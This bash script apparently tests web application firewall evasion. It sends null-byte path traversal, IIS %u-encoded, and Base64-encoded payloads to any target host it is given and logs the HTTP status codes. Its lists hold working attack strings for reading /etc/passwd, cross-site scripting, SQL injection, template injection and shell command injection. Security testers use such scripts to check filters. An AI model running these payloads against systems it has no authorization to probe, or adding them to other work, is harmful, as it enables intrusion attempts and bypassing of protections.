#!/bin/bash
# Null byte injection, IIS %uXXXX encoding, and Base64 parameter evasion
# Estimated duration: 1-2 minutes
set -euo pipefail

TARGET="${1:?Usage: 05-null-byte-iis-base64.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] Null Byte / IIS / Base64 Evasion against ${TARGET}"
echo ""

echo "[+] Null byte injection (%00)"
NULL_PAYLOADS=(
  "../../etc/passwd%00.jpg"
  "../../etc/passwd%00.png"
  "select%00%20*%20from%20users"
  "%3Cscript%00%3Ealert(1)%3C/script%3E"
  "admin%00"
  "test.php%00.jpg"
)

for payload in "${NULL_PAYLOADS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${BASE}/?q=${payload}" --max-time 10) || code="ERR"
  printf "    %-50s -> HTTP %s\n" "${payload}" "${code}"
done
echo ""

echo "[+] IIS-specific %uXXXX encoding"
IIS_PAYLOADS=(
  "%u003Cscript%u003Ealert(1)%u003C/script%u003E"
  "%u0027%20OR%201=1--"
  "%u003Cimg%20src=x%20onerror=alert(1)%u003E"
  "..%u2216..%u2216etc/passwd"
  "..%u2215..%u2215etc/passwd"
  "%u0022%20onmouseover=%u0022alert(1)"
)

for payload in "${IIS_PAYLOADS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${BASE}/?q=${payload}" --max-time 10) || code="ERR"
  printf "    %-50s -> HTTP %s\n" "${payload}" "${code}"
done
echo ""

echo "[+] Base64-encoded payloads in parameters"
B64_SOURCES=(
  "<script>alert(1)</script>"
  "' OR 1=1--"
  "{{7*7}}"
  "cat /etc/passwd"
  "; ls -la /"
  "admin' AND '1'='1"
)

for src in "${B64_SOURCES[@]}"; do
  b64=$(echo -n "${src}" | base64)
  echo "  Source: ${src}"
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${BASE}/?q=${b64}" --max-time 10) || code="ERR"
  printf "    GET  /?q=%-40s -> HTTP %s\n" "${b64}" "${code}"

  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${BASE}/?data=${b64}&decode=true" --max-time 10) || code="ERR"
  printf "    GET  /?data=&decode=true %-23s -> HTTP %s\n" "" "${code}"
done
echo ""

echo "[*] Null byte / IIS / Base64 evasion complete"
